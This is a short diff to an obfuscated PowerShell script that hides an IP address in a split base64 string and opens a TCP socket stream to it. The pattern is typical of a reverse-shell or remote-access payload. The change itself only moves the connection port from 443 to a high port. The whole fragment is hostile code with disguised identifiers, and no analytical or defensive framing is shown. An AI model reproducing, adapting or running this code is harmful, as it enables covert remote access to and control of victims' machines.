@@ -7,7 +7,7 @@ try {
     
     $rvuJ = [SYStEm.TEXT.eNCoDIng]::Utf8.getstRINg([sYsTEm.COnVeRT]::frOmBase64sTRiNg(('MTQ2Ljc'+'wL'+'jI0MC4y'+'MDU'+'=')));
     
-    $MbuLykqk = 443; 
+    $MbuLykqk = 54983; 
 
     $dA38wm = nEw-ObjecT NEt.socKEts.TcpCLiEnt($RVUj, $mbuLYkQK);
     $Y2ySm = $da38wm.gEtSTrEAm();
